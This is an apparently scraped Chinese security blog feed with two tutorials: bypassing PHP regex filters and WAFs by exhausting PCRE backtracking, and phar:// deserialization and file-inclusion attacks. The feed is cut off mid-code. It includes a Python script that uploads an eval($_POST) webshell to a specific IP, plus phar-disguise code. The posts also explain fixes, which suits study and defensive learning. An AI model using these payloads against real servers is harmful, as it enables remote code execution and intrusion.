    <link href="/decemberus.com/2022/01/09/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E6%9F%90%E4%BA%9B%E5%AE%89%E5%85%A8%E9%99%90%E5%88%B6/"/>
    <url>/decemberus.com/2022/01/09/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E6%9F%90%E4%BA%9B%E5%AE%89%E5%85%A8%E9%99%90%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP利用PCRE回溯次数限制绕过某些安全限制"><a href="#PHP利用PCRE回溯次数限制绕过某些安全限制" class="headerlink" title="PHP利用PCRE回溯次数限制绕过某些安全限制"></a>PHP利用PCRE回溯次数限制绕过某些安全限制</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);  <br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_php</span>(<span class="hljs-variable">$input</span>)) &#123;<br>    <span class="hljs-comment">// fwrite($f, $input); ...</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="什么是正则表达式"><a href="#什么是正则表达式" class="headerlink" title="什么是正则表达式"></a>什么是正则表达式</h2><p>正则表达式是一个可以被“有限状态自动机”接受的语言类。</p><p>“有限状态自动机”，其拥有有限数量的状态，每个状态可以迁移到零个或多个状态，输入字串决定执行哪个状态的迁移。</p><p>而常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是：</p><ul><li>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</li><li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</li></ul><p>由于NFA的执行过程存在回溯，所以其性能会劣于DFA，但它支持更多功能。大多数程序语言都使用了NFA作为正则引擎，其中也包括PHP使用的PCRE库。</p><h2 id="回溯的过程是什么样子的"><a href="#回溯的过程是什么样子的" class="headerlink" title="回溯的过程是什么样子的"></a>回溯的过程是什么样子的</h2><p>所以，我们题目中的正则<code>&lt;\?.*[(;?&gt;].*</code>，假设匹配的输入是<code>&lt;?php phpinfo();//aaaaa</code>，实际执行流程是这样的：</p><p><img src="D:\mdimage\image-20221004182355365.png" alt="image-20221004182355365"> </p><p>见上图，可见第4步的时候，因为第一个<code>.*</code>可以匹配任何字符，所以最终匹配到了输入串的结尾，也就是<code>//aaaaa</code>。但此时显然是不对的，因为正则显示<code>.*</code>后面还应该有一个字符[(&#96;;?&gt;]。</p><p>所以NFA就开始回溯，先吐出一个<code>a</code>，输入变成第5步显示的<code>//aaaa</code>，但仍然匹配不上正则，继续吐出<code>a</code>，变成<code>//aaa</code>，仍然匹配不上……</p><p>最终直到吐出<code>;</code>，输入变成第12步显示的<code>&lt;?php phpinfo()</code>，此时，<code>.*</code>匹配的是<code>php phpinfo()</code>，而后面的<code>;</code>则匹配上<code>[(</code>;?&gt;]<code>，这个结果满足正则表达式的要求，于是不再回溯。13步开始向后匹配</code>;<code>，14步匹配</code>.<em><code>，第二个</code>.</em>&#96;匹配到了字符串末尾，最后结束匹配。</p><p>在调试正则表达式的时候，我们可以查看当前回溯的次数：</p><p><img src="D:\mdimage\image-20221004183012814.png" alt="image-20221004183012814"> </p><p>这里回溯了8次。</p><h2 id="PHP的pcre-backtrack-limit限制利用"><a href="#PHP的pcre-backtrack-limit限制利用" class="headerlink" title="PHP的pcre.backtrack_limit限制利用"></a>PHP的pcre.backtrack_limit限制利用</h2><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限：</p><p><img src="D:\mdimage\image-20221004183404902.png" alt="image-20221004183404902"> </p><p>这里我用的是windows的powershell，phpstrom的shell不知道为什么不可以</p><p>可见，回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万，会出现什么现象呢？比如：</p><p><img src="D:\mdimage\ad1ed05b-fab4-4316-96e0-06717ae7b444.829619d9800d.png" alt="image.png"></p><p>我们发送上述图片中的代码</p><p>可见，<code>preg_match</code>返回的非1和0，而是false。</p><p><code>preg_match</code>函数返回false表示此次执行失败了，我们可以调用<code>var_dump(preg_last_error() === PREG_BACKTRACK_LIMIT_ERROR);</code>，发现失败的原因的确是回溯次数超出了限制：</p><p><img src="D:\mdimage\e9effb6d-fd43-41aa-9bb8-1aab366649e6.a11361f8009b.png" alt="image.png"> </p><p>所以，这道题的答案就呼之欲出了。我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br>files = &#123;<br>  <span class="hljs-string">&#x27;file&#x27;</span>: BytesIO(<span class="hljs-string">b&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1000000</span>)<br>&#125;<br><br>res = requests.post(<span class="hljs-string">&#x27;http://51.158.75.42:8088/index.php&#x27;</span>, files=files, allow_redirects=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(res.headers)<br></code></pre></td></tr></table></figure><p>解释一下BytesIO</p><p>StringIO操作的只能是str，如果要操作二进制数据，就需要使用BytesIO。</p><p>BytesIO实现了在内存中读写bytes，我们创建一个BytesIO，然后写入一些bytes：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-meta">&gt;&gt;&gt; </span>f = BytesIO()<br><span class="hljs-meta">&gt;&gt;&gt; </span>f.write(<span class="hljs-string">&#x27;中文&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-number">6</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(f.getvalue())<br><span class="hljs-string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="PCRE的另一种绕过方法"><a href="#PCRE的另一种绕过方法" class="headerlink" title="PCRE的另一种绕过方法"></a>PCRE的另一种绕过方法</h2><p>延伸一下，很多基于PHP的WAF，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/SELECT.+FROM.+/is&#x27;</span>, <span class="hljs-variable">$input</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;SQL Injection&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>均存在上述问题，通过大量回溯可以进行绕过。</p><p>另外，我遇到更常见的一种WAF是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="hljs-variable">$input</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;SQL Injection&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里涉及到了正则表达式的“非贪婪模式”。在NFA中，如果我输入<code>UNION/*aaaaa*/SELECT</code>，这个正则表达式执行流程如下：</p><ul><li><code>.+?</code>匹配到<code>/</code></li><li>因为非贪婪模式，所以<code>.+?</code>停止匹配，而由<code>S</code>匹配<code>*</code></li><li><code>S</code>匹配<code>*</code>失败，回溯，再由<code>.+?</code>匹配<code>*</code></li><li>因为非贪婪模式，所以<code>.+?</code>停止匹配，而由<code>S</code>匹配<code>a</code></li><li><code>S</code>匹配<code>a</code>失败，回溯，再由<code>.+?</code>匹配<code>a</code></li><li>…</li></ul><p>回溯次数随着a的数量增加而增加。所以，我们仍然可以通过发送大量a，来使回溯次数超出<code>pcre.backtrack_limit</code>限制，进而绕过WAF：</p><p><img src="D:\mdimage\abf469d4-eb83-416e-8cb3-caa5d59ffb6f.b6586a5d1f9b.png" alt="image.png"></p><p>那么，如何修复这个问题呢？</p><p>其实如果我们仔细观察PHP文档，是可以看到<code>preg_match</code>函数下面的警告的：</p><p>如果用<code>preg_match</code>对字符串进行匹配，一定要使用<code>===</code>全等号来判断返回值，如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> is_php(<span class="hljs-variable">$data</span>)&#123;  <br>    return preg_match(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);  <br>&#125;<br><br><span class="hljs-keyword">if</span>(is_php(<span class="hljs-variable">$input</span>) === <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-regexp">//</span> fwrite(<span class="hljs-variable">$f</span>, <span class="hljs-variable">$input</span>); ...<br>&#125;<br></code></pre></td></tr></table></figure><p>这样，即使正则执行失败返回false，也不会进入if语句。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>phar反序列化</title>
    <link href="/decemberus.com/2021/12/31/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/decemberus.com/2021/12/31/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><h1 id="0x01-前言与利用方法"><a href="#0x01-前言与利用方法" class="headerlink" title="0x01 前言与利用方法"></a>0x01 前言与利用方法</h1><p>通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入unserialize()，随着代码安全性越来越高，利用难度也越来越大。但在不久前的Black Hat上，安全研究员<code>Sam Thomas</code>分享了议题<code>It’s a PHP unserialization vulnerability Jim, but not as we know it</code>，利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>（file_exists()、is_dir()等）参数可控的情况下，配合<strong>phar:&#x2F;&#x2F;伪协议</strong>，可以不依赖unserialize()直接进行反序列化操作。这让一些看起来“人畜无害”的函数变得“暗藏杀机”，下面我们就来了解一下这种攻击手法。</p><blockquote><p>1、phar文件能够上传至服务器<br>&#x2F;&#x2F;即要求存在file_get_contents()、fopen()这种函数</p><p>2、要有可利用的魔术方法<br>&#x2F;&#x2F;这个的话用一位大师傅的话说就是利用魔术方法作为”跳板”</p><p>3、文件操作函数的参数可控，且:、&#x2F;、phar等特殊字符没有被过滤<br>&#x2F;&#x2F;一般利用姿势是上传Phar文件后通过伪协议Phar来实现反序列化，伪协议Phar格式是<code>Phar://</code>这种，如果这几个特殊字符被过滤就无法实现反序列化</p></blockquote><h1 id="0x02-原理分析"><a href="#0x02-原理分析" class="headerlink" title="0x02 原理分析"></a>0x02 原理分析</h1><h2 id="2-1-phar文件结构"><a href="#2-1-phar文件结构" class="headerlink" title="2.1 phar文件结构"></a>2.1 phar文件结构</h2><p>在了解攻击手法之前我们要先看一下phar的文件结构，通过查阅手册可知一个phar文件有四部分构成：</p><h3 id="1-a-stub"><a href="#1-a-stub" class="headerlink" title="1. a stub"></a>1. a <strong>stub</strong></h3><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><h3 id="2-a-manifest-describing-the-contents"><a href="#2-a-manifest-describing-the-contents" class="headerlink" title="2. a manifest describing the contents"></a>2. a <strong>manifest</strong> describing the contents</h3><p>压缩文件的属性等信息，以<strong>序列化</strong>存储；</p><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p><h3 id="3-the-file-contents"><a href="#3-the-file-contents" class="headerlink" title="3. the file contents"></a>3. the file <strong>contents</strong></h3><p>被压缩文件的内容。</p><h3 id="4-optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#4-optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="4. [optional] a signature for verifying Phar integrity (phar file format only)"></a>4. [optional] a <strong>signature</strong> for verifying Phar integrity (phar file format only)</h3><p>签名，放在文件末尾，格式如下：</p><p><img src="D:\mdimage\image-20220925150541759.png" alt="image-20220925150541759"> </p><p>从官方文档中不难看出，签证尾部的<code>01</code>代表md5加密，<code>02</code>代表sha1加密，<code>04</code>代表sha256加密，<code>08</code>代表sha512加密<br>简单的举个栗子<br>用010editor打开Phar文件</p><p><img src="D:/mdimage/b8955f27f2934e8cab39b52ffa17da77.png" alt="在这里插入图片描述"> </p><p>当我们修改文件的内容时，签名就会变得无效，这个时候需要更换一个新的签名<br>更换签名的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    f = file.read() <br>s = f[:-<span class="hljs-number">28</span>] <span class="hljs-comment"># 获取要签名的数据</span><br>h = f[-<span class="hljs-number">8</span>:] <span class="hljs-comment"># 获取签名类型和GBMB标识</span><br>newf = s + sha1(s).digest() + h <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newtest.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(newf) <span class="hljs-comment"># 写入新文件</span><br></code></pre></td></tr></table></figure><h2 id="2-2-demo测试"><a href="#2-2-demo测试" class="headerlink" title="2.2 demo测试"></a>2.2 demo测试</h2><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。</p><p><strong>注意：要将php.ini中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成phar文件。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<span class="hljs-comment">//启动缓冲</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>将结果放入winhex</p><p><img src="D:\mdimage\image-20220925191450340.png" alt="image-20220925191450340"> </p><p>可以明显的看到meta-data是以序列化的形式存储的：</p><p>有序列化数据必然会有反序列化操作，php一大部分的<a href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="D:\mdimage\17c4c630-b5f7-4e02-af48-160cd8fcf73a.png" alt="img"></p><p>来看一下php底层代码是如何处理的：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php-src<span class="hljs-regexp">/ext/</span>phar/phar.c<br></code></pre></td></tr></table></figure><p><img src="D:\mdimage\44a2f1dc-1c23-4638-8f6e-24fc75d68c2a.png" alt="img"> </p><p>通过一个小demo来证明一下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">phar_test1.php<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Destruct called&#x27;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar/test.txt&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>); <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="D:\mdimage\7497d95b-b33f-4de8-bc5e-03890aff1bd9.png" alt="img"> </p><p>其他函数当然也是可行的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">phar_test2.php<br><br><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Destruct called&#x27;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar/a_random_string&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-comment">//......</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，一些之前看起来“人畜无害”的函数也变得“暗藏杀机”，极大的拓展了攻击面。</p><p>可以简单的解释一下这里</p><p>最开始给的代码是给了利用方法，然+后接下来是给的传输方法</p><h2 id="2-3-将phar伪造成其他格式的文件"><a href="#2-3-将phar伪造成其他格式的文件" class="headerlink" title="2.3 将phar伪造成其他格式的文件"></a>2.3 将phar伪造成其他格式的文件</h2><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<span class="hljs-comment">//删除文件</span><br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif文件头</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里解释一下addFromString函数</p><blockquote><p>以字符串的形式添加一个文件到 phar 档案</p><p>public Phar::addFromString(string <code>$localname</code>, string <code>$contents</code>): void</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">localname</span><br></code></pre></td></tr></table></figure><p>文件保存到档案时的路径。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">contents</span><br></code></pre></td></tr></table></figure><p>要保存的文件内容。</p></blockquote><p><img src="D:\mdimage\6abec4c4-e0a3-4520-bbc8-de0ba69c4c65.png" alt="img"> </p><h1 id="0x03-实际利用"><a href="#0x03-实际利用" class="headerlink" title="0x03 实际利用"></a>0x03 实际利用</h1><h2 id="3-1-利用条件"><a href="#3-1-利用条件" class="headerlink" title="3.1 利用条件"></a>3.1 利用条件</h2><p>任何漏洞或攻击手法不能实际利用，都是纸上谈兵。在利用之前，先来看一下这种攻击的利用条件。</p><ol><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li></ol><h2 id="3-2-一个例题"><a href="#3-2-一个例题" class="headerlink" title="3.2 一个例题"></a>3.2 一个例题</h2><p><img src="D:/mdimage/1.png" alt="1"> </p><p>源代码如上图所示</p><p>没有做任何过滤，所以可以直接利用</p><h2 id="3-3-Phar协议文件包含"><a href="#3-3-Phar协议文件包含" class="headerlink" title="3.3 Phar协议文件包含"></a>3.3 Phar协议文件包含</h2><p>因为phar文件本质就是以中压缩文件，所以可以使用phar伪协议读取执行</p><p>很多网站都采用单一入口模式来作为网站文件加载模式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//单一入口模式</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//关闭错误显示</span><br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]); <span class="hljs-comment">//接收文件名</span><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;index&#x27;</span>:<span class="hljs-variable">$file</span>; <span class="hljs-comment">//判断为空或者等于index</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$action</span>.<span class="hljs-string">&#x27;.php&#x27;</span>); <span class="hljs-comment">//载入相应文件</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>此处就存在文件包含漏洞，可以利用伪协议（读base64那个）读取文件源码，但是只能访问php文件</p><p><img src="D:/mdimage/image-20220925204103040.png" alt="image-20220925204103040"> </p><p>如果该网站同时存在上传图片的功能，这时就可以利用phar反序列化漏洞</p><p>首先写一个 test.php，写入要执行的命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>将 test.php 压缩为 test.zip 注意：压缩时选择仅存储，在文件上传处上传 test.zip 文件</p><p>将 test.zip 文件后缀改为 jpg，上传 jpg 文件，在 url 中访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?r=phar:<span class="hljs-regexp">//</span>pic<span class="hljs-regexp">/test.jpg/</span>test<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/1634557719_616d5f17a02732e464802.jpeg" alt="image-20211017220537555"> </p><p>不仅可以使用phar协议，zip协议也是可以的</p><p>解释一下这里为什么要有test，这取决于phar文件时addFromString函数里参数填的什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br></code></pre></td></tr></table></figure><h2 id="3-4-zip文件包含"><a href="#3-4-zip文件包含" class="headerlink" title="3.4 zip文件包含"></a>3.4 zip文件包含</h2><p>和phar用法不同效果一致</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//单一入口模式</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span 